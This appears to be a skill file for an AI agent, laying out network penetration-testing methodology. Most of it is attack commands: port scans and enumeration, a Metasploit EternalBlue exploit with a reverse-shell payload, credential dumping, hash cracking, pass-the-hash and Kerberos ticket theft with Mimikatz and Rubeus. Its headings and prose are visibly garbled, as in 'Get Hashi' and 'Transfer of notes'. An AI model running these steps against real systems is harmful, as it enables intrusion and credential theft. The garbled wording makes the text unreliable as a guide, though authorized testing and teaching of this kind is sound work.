---
name: network-penetration-testing
description: Professional skills and methodology for network penetration testing
version: 1.0.0
---

# Network penetration test

## Overview

Network penetration testing is an important part of assessing the security of the network infrastructure.

## Test Scope

### 1. Information Gathering

**Inspection items:**
- Network Top
- Host found it.
- Port Scanning
- Service recognition

### 2. Vulnerability Scanning

**Inspection items:**
- System Leaks
- Service vulnerabilities
- Security Misconfiguration
- Weak Password

### 3. Vulnerability Exploitation

**Inspection items:**
- Remote Code Execution
- Privilege Escalation
- Lateral Movement
- Persistence

## Information Gathering

### Network Scanning

**Using Nmap:**
```bash
# Host found it.
nmap -sn 192.168.1.0/24

# Port Scan
nmap -sS -p- 192.168.1.100

# Service recognition
nmap -sV -sC 192.168.1.100

# Operational system recognition
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Quick Port Scan
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Equations

**SMB list:**
```bash
# EnumerateSMBShare
smbclient -L //192.168.1.100 -N

# EnumerateSMBUser
enum4linux -U 192.168.1.100

# UsingnmapScript
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC examples:**
```bash
# EnumerateRPCServices
rpcclient -U "" -N 192.168.1.100

# UsingnmapScript
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumerates:**
```bash
# SNMPScan
snmpwalk -v2c -c public 192.168.1.100

# Usingonesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### UsingNessus

```bash
# StartNessus
# AccessWebInterface
# Create a scan task
# Analyze the scan results
```

### UsingOpenVAS

```bash
# StartOpenVAS
gvm-setup

# AccessWebInterface
# Create a scan task
# Analyze the scan results
```

### Use Nmap scripts

```bash
# Lacuna scan.
nmap --script vuln 192.168.1.100

# A specific bug scan.
nmap --script smb-vuln-ms17-010 192.168.1.100

# All Scripts
nmap --script all 192.168.1.100
```

## Vulnerability Exploitation

### Metasploit

**Base use:**
```bash
# StartMetasploit
msfconsole

# Search for holes
search ms17-010

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Implementation
exploit
```

**Post-infiltration:**
```bash
# Access to system information
sysinfo

# Access permissions
getsystem

# Migration process
migrate <pid>

# Get Hashi.
hashdump

# Get Password
run post/windows/gather/smart_hashdump
```

### Common Leakage Utilization

**EternalBlue:**
```bash
# UsingMetasploit
use exploit/windows/smb/ms17_010_eternalblue

# Use stand-alone tools
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# UsingMetasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Use stand-alone tools
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Decrypt

**Using Hashcat:**
```bash
# DecryptNTLMHash
hashcat -m 1000 hashes.txt wordlist.txt

# DecryptLMHash
hashcat -m 3000 hashes.txt wordlist.txt

# Use rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# Break Hashi.
john hashes.txt

# Use Dictionary
john --wordlist=wordlist.txt hashes.txt

# Use rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Transfer of notes

**Using Mimikatz:**
```bash
# Withdrawal of notes
sekurlsa::tickets /export

# Inject the notes.
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Requesting papers
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject the notes.
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Using the Tools

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Hide Scan
nmap -sS -T2 -f -D RND:10 target

# UDPScan
nmap -sU -p- target
```

### Metasploit

```bash
# Start Frame
msfconsole

# Database Initialization
msfdb init

# Import Scan Results
db_import nmap.xml

# View Host
hosts

# View Services
services
```

### Burp Suite

**Web scan:**
1. Configure Agent
2. Browse target network
3. Analysis of traffic
4. Active Scan

## Test Checklist

### Information Gathering
- [ ] I found it on the Internet.
- [ ] Host found it.
- [ ] Port Scanning
- [ ] Service recognition
- [ ] Operational system recognition

### Vulnerability Scanning
- [ ] System Gap Scanning
- [ ] Service vulnerability scanning
- [ ] Configure Error Check
- [ ] Weak password check

### Vulnerability Exploitation
- [ ] Remote Code Execution
- [ ] Privilege Escalation
- [ ] Lateral Movement
- [ ] Persistence

## Common Security Issues

### 1. System without patches

**Question:**
- System not updated in time
- There are known loopholes.
- Mismanagement of patches

**Repairs:**
- Install patches in a timely manner
- Create patch management process
- Apply security updates regularly

### 2. Weak Password

**Question:**
- Default password
- Simple password
- Password Reuse

**Repairs:**
- Implement a strong password policy
- Enable multifactor authentication
- Change passwords on a regular basis

### 3. Open Port

**Question:**
- Unnecessary port open
- Service exposure
- Firewall Configuration Error

**Repairs:**
- Close unnecessary port
- Implementation of firewall rules
- Access with VPN

### 4. Security Misconfiguration

**Question:**
- Default Configuration
- Too much permission.
- Inappropriate service allocation

**Repairs:**
- Security configuration baseline
- Principle of Least Privilege
- Periodic configuration review

## Best Practices

### 1. Information Gathering

- Full Scan
- Multitool Authentication
- Record found.
- Analysis Results

### 2. Vulnerability Exploitation

- Authorized Testing
- Minimum impact
- Record the Actions
- Timely clean-up

### 3. Preparation of the report

- Detailed records
- Risk rating
- Remediation Recommendations
- Verification Steps

## Important Notes

- Test only in an authorized environment
- Avoid impact on production systems
- Comply with Applicable Laws and Regulations
- Protect test data